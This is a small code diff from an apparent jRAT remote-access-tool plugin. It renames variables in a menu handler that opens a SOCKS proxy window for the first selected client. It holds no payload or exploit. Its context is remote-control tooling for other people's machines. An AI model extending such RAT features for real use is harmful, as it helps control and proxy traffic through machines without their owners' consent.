@@ -8,11 +8,11 @@ import jrat.api.ui.RATMenuItemActionListener;
 public class MenuListener implements RATMenuItemActionListener {
 
 	@Override
-	public void onClick(List<Client> servers) {
+	public void onClick(List<Client> clients) {
 		try {
-			if (servers.size() > 0) {
-				final Client server = servers.get(0);		
-				new FrameSocks(server).setVisible(true);
+			if (clients.size() > 0) {
+				Client c = clients.get(0);		
+				new FrameSocks(c).setVisible(true);
 			}
 		} catch (Exception ex) {
 			ex.printStackTrace();
